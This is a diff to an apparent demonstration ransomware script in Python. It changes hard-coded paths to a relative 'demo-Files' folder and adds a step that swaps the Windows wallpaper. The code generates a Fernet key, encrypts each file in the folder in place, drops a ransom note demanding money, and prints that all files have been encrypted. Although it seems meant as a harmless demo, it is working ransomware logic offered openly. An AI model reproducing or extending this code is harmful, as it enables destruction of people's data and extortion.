@@ -8,7 +8,7 @@ from cryptography.fernet import Fernet
 ###########################################################################
 
 # folder path
-dir_path = '/home/johannes/Documents/GitHub_Repositories/Demo-Ransomware/demo-Files'
+dir_path = 'demo-Files'
 
 files = [] # new list
 
@@ -27,7 +27,7 @@ print(files) # check --> works
 key = Fernet.generate_key()
 
 # backup the key in a file
-with open('/home/johannes/Documents/GitHub_Repositories/Demo-Ransomware/demo-Files/filekey.key', 'wb') as filekey:
+with open('demo-Files/filekey.key', 'wb') as filekey:
     filekey.write(key)
 # Above code will generate a file with the name filekey.key.
 # The file will contain one line, which is a string acting as a key
@@ -41,10 +41,10 @@ Cryptor = Fernet(key)
 
 # Loop through all files:
 for file in files:
-    victimFile = open(f'/home/johannes/Documents/GitHub_Repositories/Demo-Ransomware/demo-Files/{file}', 'r') # open file for reading
+    victimFile = open(f'demo-Files/{file}', 'r') # open file for reading
     cleartext = victimFile.read()
     ciphertext = Cryptor.encrypt(bytes(cleartext, 'utf-8'))
-    victimFile = open(f'/home/johannes/Documents/GitHub_Repositories/Demo-Ransomware/demo-Files/{file}', 'wb') # open file for writing
+    victimFile = open(f'demo-Files/{file}', 'wb') # open file for writing
     victimFile.write(ciphertext)
     victimFile.close()
 
@@ -56,6 +56,19 @@ for file in files:
 ###########################################################################
 
 note = "You have been encrypted by Giuli-Cryptor. Give me moneeeeey! Miau >:)"
-ransomNote = open('/home/johannes/Documents/GitHub_Repositories/Demo-Ransomware/demo-Files/ReadMe.html', 'x')
+ransomNote = open('demo-Files/ReadMe.html', 'x')
 ransomNote.write(note)
 ransomNote.close()
+
+###########################################################################
+# Change Desktop Wallpaper:
+###########################################################################
+path = "meow_tmp.png"
+ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 0)
+
+
+###########################################################################
+# Script Closing Statement:
+###########################################################################
+
+print("----------   All files have been encrypted.  ----------")
